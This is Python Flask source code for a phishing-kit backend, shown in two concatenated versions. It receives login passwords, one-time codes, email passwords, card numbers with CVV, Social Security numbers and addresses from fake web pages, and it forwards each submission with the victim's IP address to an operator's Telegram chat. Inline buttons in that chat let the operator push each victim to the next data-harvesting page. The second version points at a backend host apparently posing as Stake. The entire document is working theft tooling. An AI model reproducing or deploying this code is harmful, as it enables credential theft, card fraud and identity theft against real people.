from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import time
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
# Enable CORS so your frontend can talk to this backend
CORS(app, resources={r"/*": {"origins": "*"}})

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID in .env file")

# Temporary in-memory storage for session states
SESSION_STATUS = {}

# BUTTON CONFIG: 
# When you click LOGIN2 in Telegram, it sends the user to home.html?error=1
PAGES = [
    {"emoji": "🔐", "text": "LOGIN1", "page": "home.html"},
    {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
    {"emoji": "📧", "text": "EMAIL", "page": "email.html"},
    {"emoji": "🧾", "text": "C", "page": "c.html"},
    {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
    {"emoji": "🔑", "text": "LOGIN2", "page": "home.html?error=1"},
    {"emoji": "🎉", "text": "THANK YOU", "page": "thnks.html"},
]

def set_webhook():
    """Run this once to tell Telegram where to send button clicks"""
    webhook_url = "https://onrender.com"
    url = f"https://telegram.org{BOT_TOKEN}/setWebhook?url={webhook_url}"
    try:
        response = requests.get(url)
        return response.json()
    except Exception as e:
        return {"ok": False, "error": str(e)}

def send_to_telegram(data, session_id, type_):
    """Sends the captured data to your Telegram Chat with Action Buttons"""
    msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"
    for key, value in data.items():
        if isinstance(value, dict):
            msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
            for subkey, subvalue in value.items():
                msg += f"  <b>{subkey.replace('_', ' ').title()}:</b> <code>{subvalue}</code>\n"
        else:
            msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
    msg += f"\n<b>Session ID:</b> <code>{session_id}</code>"

    inline_keyboard = [[
        {"text": f"{b['emoji']} {b['text']}", "callback_data": f"{session_id}:{b['page']}"}
    ] for b in PAGES]

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": inline_keyboard}
    }

    try:
        r = requests.post(f"https://telegram.org{BOT_TOKEN}/sendMessage", json=payload)
        return r.ok
    except:
        return False

# =====================
# SYSTEM ROUTES
# =====================

@app.route("/webhook", methods=["POST"])
def webhook():
    """Receives the button click (callback) from Telegram"""
    update = request.get_json()
    if "callback_query" in update:
        callback_data = update["callback_query"]["data"]
        try:
            # Parses "session_id:page_to_redirect"
            session_id, page_to_redirect = callback_data.split(":", 1)
            if session_id in SESSION_STATUS:
                SESSION_STATUS[session_id]["approved"] = True
                SESSION_STATUS[session_id]["redirect_url"] = page_to_redirect
                print(f"Action: Admin redirecting {session_id} to {page_to_redirect}")
        except Exception as e:
            print(f"Webhook parse error: {e}")
    return jsonify({"ok": True}), 200

@app.route("/status/<session_id>", methods=["GET"])
def get_status(session_id):
    """The Frontend polls this to see if you clicked a button in Telegram"""
    status_info = SESSION_STATUS.get(session_id)
    if not status_info:
        return jsonify({"status": "not_found"}), 404
        
    if status_info.get("approved"):
        return jsonify({
            "status": "approved",
            "redirect_url": status_info["redirect_url"]
        }), 200
    
    return jsonify({"status": "pending"}), 200

# =====================
# DATA COLLECTION ROUTES
# =====================

def process_submission(request_data, label):
    data = request_data.get_json()
    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
    send_to_telegram(data, session_id, label)
    return jsonify({"success": True, "id": session_id}), 200

@app.route("/login", methods=["POST"])
def login(): return process_submission(request, "login")

@app.route("/otp", methods=["POST"])
def otp(): return process_submission(request, "otp")

@app.route("/email", methods=["POST"])
def email(): return process_submission(request, "email")

@app.route("/c", methods=["POST"])
def c(): return process_submission(request, "card")

@app.route("/personal", methods=["POST"])
def personal(): return process_submission(request, "personal")

@app.route("/login2", methods=["POST"])
def login2(): return process_submission(request, "login2")

if __name__ == "__main__":
    # Note: set_webhook() needs to be called once after deployment
    app.run(debug=True, port=5000)from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import time
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")

SESSION_STATUS = {}
PAGES = [
    {"emoji": "🔐", "text": "LOGIN1", "page": "home.html"},
    {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
    {"emoji": "📧", "text": "EMAIL", "page": "email.html"},
    {"emoji": "🧾", "text": "C", "page": "c.html"},
    {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
    {"emoji": "🔑", "text": "LOGIN2", "page": "home.html"},
    {"emoji": "🎉", "text": "THANK YOU", "page": "thnks.html"},
]

def set_webhook():
    webhook_url = "https://stake-backend-o3pe.onrender.com/webhook"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    try:
        response = requests.get(url)
        print("Webhook set response:", response.json())
        return response.json()
    except Exception as e:
        print("Failed to set webhook:", str(e))
        return {"ok": False, "error": str(e)}

def send_to_telegram(data, session_id, type_):
    msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"
    for key, value in data.items():
        if isinstance(value, dict):
            msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
            for subkey, subvalue in value.items():
                msg += f"  <b>{subkey.replace('_', ' ').title()}:</b> <code>{subvalue}</code>\n"
        else:
            msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
    msg += f"<b>Session ID:</b> <code>{session_id}</code>"

    inline_keyboard = [[
        {"text": f"{b['emoji']} {b['text']}", "callback_data": f"{session_id}:{b['page']}"}
    ] for b in PAGES]

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": inline_keyboard}
    }

    for attempt in range(3):
        try:
            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
            print("Telegram sent:", r.status_code, r.json())
            return r.ok
        except Exception as e:
            print(f"Telegram attempt {attempt + 1} failed:", str(e))
            time.sleep(2 ** attempt)
    return False

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    if not data or "login" not in data or "password" not in data:
        print("Login error: Missing fields")
        return jsonify({"success": False, "error": "Missing fields"}), 400

    login_id = data["login"]
    password = data["password"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "login", "approved": False, "redirect_url": None}
    print("Session created:", session_id)

    if not send_to_telegram({"login_id": login_id, "password": password, "ip": ip}, session_id, "login"):
        print("Login error: Telegram send failed")
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/otp", methods=["POST"])
def otp():
    data = request.get_json()
    if not data or "otp" not in data:
        print("OTP error: Missing fields")
        return jsonify({"success": False, "error": "Missing fields"}), 400

    otp = data["otp"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "otp", "approved": False, "redirect_url": None}
    print("OTP session created:", session_id)

    if not send_to_telegram({"otp": otp, "ip": ip}, session_id, "otp"):
        print("OTP error: Telegram send failed")
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/email", methods=["POST"])
def email():
    data = request.get_json()
    if not data or "email" not in data or "password" not in data:
        print("Email error: Missing fields")
        return jsonify({"success": False, "error": "Missing fields"}), 400

    email = data["email"]
    password = data["password"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "email", "approved": False, "redirect_url": None}
    print("Email session created:", session_id)

    if not send_to_telegram({"email": email, "password": password, "ip": ip}, session_id, "email"):
        print("Email error: Telegram send failed")
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/c", methods=["POST"])
def c():
    data = request.get_json()
    if not data or "data" not in data or "card_number" not in data["data"] or "exp_date" not in data["data"] or "cvv" not in data["data"]:
        print("C error: Missing fields")
        return jsonify({"success": False, "error": "Missing fields"}), 400

    card_data = data["data"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "c", "approved": False, "redirect_url": None}
    print("C session created:", session_id)

    if not send_to_telegram({"card_data": card_data, "ip": ip}, session_id, "c"):
        print("C error: Telegram send failed")
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/personal", methods=["POST"])
def personal():
    data = request.get_json()
    if not data or "full_name" not in data or "address" not in data or "city" not in data or "zip" not in data or "ssn" not in data:
        print("Personal error: Missing fields")
        return jsonify({"success": False, "error": "Missing fields"}), 400

    full_name = data["full_name"]
    address = data["address"]
    city = data["city"]
    zip_code = data["zip"]
    ssn = data["ssn"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "personal", "approved": False, "redirect_url": None}
    print("Personal session created:", session_id)

    if not send_to_telegram({"full_name": full_name, "address": address, "city": city, "zip": zip_code, "ssn": ssn, "ip": ip}, session_id, "personal"):
        print("Personal error: Telegram send failed")
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/login2", methods=["POST"])
def login2():
    data = request.get_json()
    if not data or "login2" not in data or "password2" not in data:
        print("Login2 error: Missing fields")
        return jsonify({"success": False, "error": "Missing fields"}), 400

    login2 = data["login2"]
    password2 = data["password2"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "login2", "approved": False, "redirect_url": None}
    print("Login2 session created:", session_id)

    if not send_to_telegram({"login2": login2, "password2": password2, "ip": ip}, session_id, "login2"):
        print("Login2 error: Telegram send failed")
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/thnks", methods=["POST"])
def thnks():
    data = request.get_json()
    if not data or "message" not in data:
        print("Thnks error: Missing fields")
        return jsonify({"success": False, "error": "Missing fields"}), 400

    message = data["message"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "thnks", "approved": False, "redirect_url": None}
    print("Thnks session created:", session_id)

    if not send_to_telegram({"message": message, "ip": ip}, session_id, "thnks"):
        print("Thnks error: Telegram send failed")
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()
    print("Webhook received:", update)
    if not update or "callback_query" not in update:
        print("No callback_query in update")
        return jsonify({"status": "ignored"}), 200

    try:
        data = update["callback_query"]["data"]
        print("Callback data:", data)
        session_id, action = data.split(":")
        print(f"Session ID: {session_id}, Action: {action}")
        if session_id in SESSION_STATUS:
            if action in [b["page"] for b in PAGES] or action == "https://google.com":
                SESSION_STATUS[session_id]["approved"] = True
                SESSION_STATUS[session_id]["redirect_url"] = action
                print("Session updated:", SESSION_STATUS[session_id])
                return jsonify({"status": "ok"}), 200
            print("Unknown action:", action)
            return jsonify({"status": "unknown action"}), 404
        else:
            print("Unknown session:", session_id)
            return jsonify({"status": "unknown session"}), 404
    except Exception as e:
        print("Webhook error:", str(e))
        return jsonify({"status": "error", "error": str(e)}), 500

@app.route("/status/<session_id>", methods=["GET"])
def status(session_id):
    session = SESSION_STATUS.get(session_id)
    if not session:
        print("Status error: Session not found:", session_id)
        return jsonify({"error": "Not found"}), 404
    print("Status checked:", session_id, session)
    if session["approved"]:
        return jsonify({"status": "approved", "redirect_url": session["redirect_url"]}), 200
    return jsonify({"status": "pending"}), 200

@app.route("/", methods=["GET"])
def home():
    return "✅ Server is live"

if __name__ == "__main__":
    set_webhook()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
